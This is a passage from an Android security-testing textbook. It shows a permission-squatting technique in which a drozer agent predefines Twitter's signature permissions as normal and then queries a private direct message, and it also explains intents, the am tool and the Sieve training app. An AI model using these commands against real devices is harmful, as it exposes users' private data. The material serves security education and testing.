Grant Uri Permissions: False
Path Permissions:
Path: /status_groups_view
Type: PATTERN_PREFIX
Read Permission: com.twitter.android.permission.READ_DATA
Write Permission: null
Authority: com.twitter.android.provider.SuggestionsProvider
Read Permission: com.twitter.android.permission.RESTRICTED
Write Permission: com.twitter.android.permission.RESTRICTED
Content Provider: com.twitter.android.provider.SuggestionsProvider
Multiprocess Allowed: False
Grant Uri Permissions: False
Path Permissions:
Path: /search_suggest_query
Type: PATTERN_PREFIX
Read Permission: android.permission.GLOBAL_SEARCH
Write Permission: null
The com.twitter.android.permission.RESTRICTED permission that protects one of the content providers has the
protectionLevel of signature, which is the most stringent that Android has to offer. This means that an
application that requests this permission will not have it granted unless the signing certificate matches that of
the Twitter application. To see this protection level, use drozer as shown here:
dz> run information.permissions --permission
com.twitter.android.permission.RESTRICTED
No description
2 - signature
Next, uninstall the Twitter application and compile and install a version of drozer that defines all the
permissions of the Twitter application with a protection level of normal instead and then also uses these
permissions:
$ drozer agent build --define-permission
com.twitter.android.permission.READ_DATA normal
com.twitter.android.permission.MAPS_RECEIVE normal
com.twitter.android.permission.C2D_MESSAGE normal
com.twitter.android.permission.RESTRICTED normal --permission
com.twitter.android.permission.READ_DATA
com.twitter.android.permission.MAPS_RECEIVE
com.twitter.android.permission.C2D_MESSAGE
com.twitter.android.permission.RESTRICTED
com.twitter.android.permission.AUTH_APP
Done: /tmp/tmpZQugD_/agent.apk
$ adb install /tmp/tmpZQugD_/agent.apk
2528 KB/s (653400 bytes in 0.252s)
pkg: /data/local/tmp/agent.apk
Success
Now, when a user installs Twitter the defined permissions retain their protection level of normal, which allows
the exposure of all the components being protected by these permissions. The example queries a Twitter content
provider for the most recent Direct Message (DM) sent to the user:
dz> run app.provider.query content://com.twitter.android.provider
.TwitterProvider/messages?limit=1&ownerId=536649879 --projection content
| content |
| This should be private right? |
It is important to note that this is not a vulnerability in the Twitter application but rather shows a broader
platform security quirk. More detail on querying content providers is provided later in this chapter. The
important point to take away from this example: Installing a malicious application that defines particular
permissions prior to a legitimate application being installed that defines the same permissions is one way to
defeat the entire permission security model.
Attacking Application Components
Attacking another application over the Android IPC system involves finding all the exported components of the
application and attempting to use them in a way that was not intended. For activities, broadcast receivers, and
services this means you must examine all the code that handles intents from other applications. Before
examining this code in search of vulnerabilities, you must fully understand intents themselves.
A Closer Look at Intents
An intent is a data object that loosely defines a task to be performed. It can contain data and all relevant
information about the action to be performed on the data or only have a single field of information in it. An
intent can be sent to different exported components to start or interact with them. To start an activity, an intent
can be sent with the startActivity(Intent) method from the Context class. In a similar way,
sendBroadcast(Intent) and startService(Intent) can be used to interact with broadcast receivers and services.
An intent object is generic and not specific to the type of component receiving it.
Android offers two fundamentally different types of intents: explicit and implicit intents. Explicit intents directly
state the component that must receive the intent. You do this using the setComponent() or setClass() methods
on an intent object. Stating the component that must receive the intent bypasses the intent resolution process
the OS can undertake and directly delivers the intent to the specified component.
On the other hand, an implicit intent does not state the component to which it must be delivered. Rather, it
relies on the OS to determine the possible candidate(s) where the intent can be delivered. For instance, multiple
applications on a device may be capable of handling MP3 music files and if more than one choice exists, then an
application chooser activity may be displayed to the user to ask which application to deliver the intent to. This
intent resolution process relies on the matching of the presented intent against all the relevant intent filters
defined by installed applications. Intents can be matched against intent filters using three types of information:
Action
Data
Category
When defining an intent filter, specifying an action element is compulsory. Intent filters can catch relevant data
in many different ways, for instance:
Scheme—This is the scheme of any URI. For example, on https://www.google.com, the scheme is https.
Host—This is the host portion of a URI. For example, on https://www.google.com, the host is
www.google.com.
Port—This is the port portion of a URI. This can catch URIs that target a specific port.
Path, pathPrefix, and pathPattern—These can be used to match any part of the data to a desired value.
MimeType—This defines a specific MIME type for the data that is specified inside the intent.
A component to which you, as an attacker, have sent an intent may be looking for any one of the preceding
requirements. This is why when you examine an exported component, reviewing the code that handles incoming
intents is important. As food for thought, what if a malicious application had to define an intent filter for a
particular intent that is known to contain sensitive information in it? Maybe this malicious application would be
able to receive it. We explore this in greater detail later in this chapter under “Intent Sniffing”. The sending of
crafted intents for each component is also explored in their relevant sections. A utility named am is present on
each Android device that allows the crafting and sending of intents to defined application components. A
shortened version of the usage of am is shown here:
shell@android:/ $ am
usage: am [subcommand] [options]
usage: am start [-D] [-W] [-P ] [--start-profiler ]
[--R COUNT] [-S] [--opengl-trace]
[--user  | current] 
am startservice [--user  | current] 
am stopservice [--user  | current] 
...
am broadcast [--user  | all | current] 
...
am start: start an Activity. Options are:
-D: enable debugging
-W: wait for launch to complete
--start-profiler : start profiler and send results to 
-P : like above, but profiling stops when app goes idle
-R: repeat the activity launch  times. Prior to each repeat,
the top activity will be finished.
-S: force stop the target app before starting the activity
--opengl-trace: enable tracing of OpenGL functions
--user  | current: Specify which user to run as; if not
specified then run as the current user.
am startservice: start a Service. Options are:
--user  | current: Specify which user to run as; if not
specified then run as the current user.
am stopservice: stop a Service. Options are:
--user  | current: Specify which user to run as; if not
specified then run as the current user.
...
am broadcast: send a broadcast Intent. Options are:
--user  | all | current: Specify which user to send to; if not
specified then send to all users.
--receiver-permission : Require receiver to hold
permission.
...
 specifications include these flags and arguments:
[-a ] [-d ] [-t ]
[-c  [-c ] ...]
[-e|--es   ...]
[--esn  ...]
[--ez   ...]
[--ei   ...]
[--el   ...]
[--ef   ...]
[--eu   ...]
[--ecn  ]
[--eia  [, [, [,] [-f ]
[--grant-read-uri-permission] [--grant-write-uri-permission]
[--debug-log-resolution] [--exclude-stopped-packages]
[--include-stopped-packages]
[--activity-brought-to-front] [--activity-clear-top]
[--activity-clear-when-task-reset] [--activity-exclude-from-recents]
[--activity-launched-from-history] [--activity-multiple-task]
[--activity-no-animation] [--activity-no-history]
[--activity-no-user-action] [--activity-previous-is-top]
[--activity-reorder-to-front] [--activity-reset-task-if-needed]
[--activity-single-top] [--activity-clear-task]
[--activity-task-on-home]
[--receiver-registered-only] [--receiver-replace-pending]
[--selector]
[ |  | ]
Sending intents using either am or drozer will be shown in each of the sections. You can find the official Android
documentation on intents at the following address: http://developer.android.com/guide/components/intents-
filters.html. Let us get started on attacking application components.
NOTE
This chapter makes heavy use of drozer. The standard drozer application that is used for testing has only a
single permission requested: android.permission.INTERNET. This permission is requested so that drozer
can make use of the network to communicate with the Python client. Intentionally, no other permissions
are requested by drozer by default. If it is possible to perform an unintended action on another application
from drozer, then the vulnerability poses a greater threat than an application that has requested the
permission to do so. This reiterates the fact that if a user does not review the permissions being requested
when installing an application, there can be no reasonable presumption of being secure against attack.
Introducing Sieve: Your First Target Application
Various Android training applications have been created that contain intentional vulnerabilities. This is to
facilitate learning of the types of vulnerabilities that can exist in an application. Many such applications are
available with varying degrees of usefulness for a beginner.
Much of this chapter makes use of a vulnerable application created by Matthew Uzzell and Daniel Bradberry
from MWR InfoSecurity, named Sieve. You can download it alongside drozer at the following address:
https://www.mwrinfosecurity.com/products/drozer/community-edition/. Sieve is a password manager that
allows a user to save usernames and passwords for any online service in a “secure” manner. It makes use of a
master password and PIN defined by the user and encrypts password entries in its database. On the surface, it
meets all the requirements for being a secure password manager, but after you dig deeper you will see that the
security provided is broken in many ways. A user who has configured Sieve is presented with a password prompt
when logging in after device power up and then a PIN prompt thereafter. Figure 7.2 shows screenshots of Sieve.
Figure 7.2 The vulnerable Sieve password manager application
After you install it, you can find the package name of Sieve by using the app .package.info module with a filter
for the word Sieve, which is the application label associated with its launcher icon.
dz> run app.package.list -f Sieve
com.mwr.example.sieve (Sieve)
You can examine exported application components of Sieve in its manifest using one of several tools shown in
Chapter 6. Inside drozer, you can use the following method:
dz> run app.package.manifest com.mwr.example.sieve